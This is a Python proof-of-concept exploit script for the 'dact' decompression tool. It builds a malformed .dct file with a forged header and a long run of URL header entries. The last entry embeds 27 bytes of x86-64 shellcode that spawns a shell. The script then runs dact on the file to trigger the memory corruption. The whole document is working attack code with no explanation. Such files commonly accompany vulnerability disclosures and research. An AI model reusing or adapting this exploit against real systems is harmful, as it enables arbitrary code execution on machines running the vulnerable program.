import sys
import os
import binascii

f = open("./poc.dct", 'w')

d = ""
d += "444354c3"               # magic[4]
d += "00082a"                 # version[3]
d += "00000000deadbeef"       # filesize[8]
d += "4354c374"               # blk_cnt[4]
d += "41013144"               # blksize_uncomp[4]
d += "00"                     # file_opts[1]
d += "00000b70"               # file_extd_size[4]

for i in range(0, 263):
    d += "07"                 # DACT_HDR_URL[1]
    d += "0008"               # size[2]
    d += "%08x%08x" % (0, i)  # URL[8]

d += "07"                     # DACT_HDR_URL[1]
d += "001b"                   # size[2]

# URL[1b] = shellcode[27]
d += "31c048bbd19d9691d08c97ff48f7db53545f995257545eb03b0f05"
d += "0a"

# gen poc binary
f.write(binascii.unhexlify(d))
f.close()

# exploit
os.system("./dact -dcf poc.dct")

# EOF
